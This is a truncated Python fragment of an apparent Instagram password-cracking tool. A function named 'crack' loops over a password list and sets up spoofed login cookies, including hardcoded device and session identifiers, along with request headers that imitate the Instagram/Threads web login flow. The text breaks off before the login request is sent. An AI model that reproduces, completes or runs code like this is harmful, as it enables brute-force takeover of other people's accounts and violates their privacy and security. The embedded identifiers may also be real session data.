...
def crack(uid, password_list, total_count):
    ...
    try:
        for pw in password_list:
            ...
            cookies = {
            'csrftoken': csrftoken,
            'datr': 'TUpIacqWM9Ac_pxUP7iMeePV',
            'ig_did': '244C80AA-D6AB-408B-9812-4B3C05933CD3',
            'dpr': '2.75',
            'mid': 'aUhKTQABAAG1BCkwIOkVLQ25SyfC',
            'ig_nrcb': '1',
            'ps_l': '1',
            'ps_n': '1',
            'wd': '393x750',}
            ...
            'referer': 'https://www.instagram.com/accounts/login/?force_authentication&platform_app_id=1289884158313322&enable_fb_login&request_id=f82729b3-2f41-405b-aa5e-e4a7a8aae4de&next=https%3A%2F%2Fwww.instagram.com%2Foauth%2Foidc%2F%3Fapp_id%3D1289884158313322%26redirect_uri%3Dhttps%253A%252F%252Fwww.threads.com%252Flogin%252Foidc%252F%26response_type%3Dcode%26scope%3Dopenid%26state%3DATn26qV-598E-Gy6-IulyA78yJ7OJyEjMfG0j-gnyhZcPa4nQZCSK27TBPukbwJCOiKsRS1zXlvBj7DhTUwR2weNZFdJqLD6mqeZrKNmiLC_wtmVMiFr-sDvjCa4kIvfvweI47B9Tw6Ub31eDVezoW4w21_9cdqn2quHXh9KYjtxWiCEp2Uo02A50nMiMAPUmwXbaKHvGI6pDsP34AL8figGx2l5SIBOwxWeCDY5rtRRV7dUQrI%26logger_id%3Df82729b3-2f41-405b-aa5e-e4a7a8aae4de%26force_consent%3D0%26force_authentication%3D0',
            ...
            'x-ig-www-claim': '0',
            'x-instagram-ajax': '1031382660',
            'x-requested-with': 'XMLHttpRequest',
            'x-web-session-id': '1omjjv:jkblwa:a52crz',}
            data = {
